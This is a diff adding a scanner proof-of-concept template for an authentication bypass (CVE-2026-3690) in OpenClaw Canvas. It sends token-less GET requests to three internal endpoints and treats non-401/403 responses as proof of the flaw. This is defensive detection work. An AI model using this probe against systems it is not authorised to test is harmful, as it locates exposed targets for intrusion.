@@ -1,0 +1,103 @@
+[info]
+author = "AVE"
+description = "检测 OpenClaw Canvas 端点认证绕过漏洞。向 /__openclaw__/canvas/ 等端点发送未携带认证 Token 的 HTTP 请求，若返回非 401/403 状态码则表明认证已被绕过，存在漏洞。"
+id = "POC-AVE-2026-0974"
+name = "CVE-2026-3690 OpenClaw Canvas 认证绕过 PoC"
+severity = "high"
+tags = [
+    "cve-2026-3690",
+    "openclaw",
+    "auth-bypass",
+    "canvas",
+]
+vuln_id = [
+    "CVE-2026-3690",
+    "AVE-2026-0974",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/__openclaw__/canvas/"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    302,
+    301,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "401",
+    "403",
+    "Unauthorized",
+    "Forbidden",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/__openclaw__/a2ui/"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    302,
+    301,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "401",
+    "403",
+    "Unauthorized",
+    "Forbidden",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/__openclaw__/ws"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    101,
+    302,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "401",
+    "403",
+    "Unauthorized",
+    "Forbidden",
+]
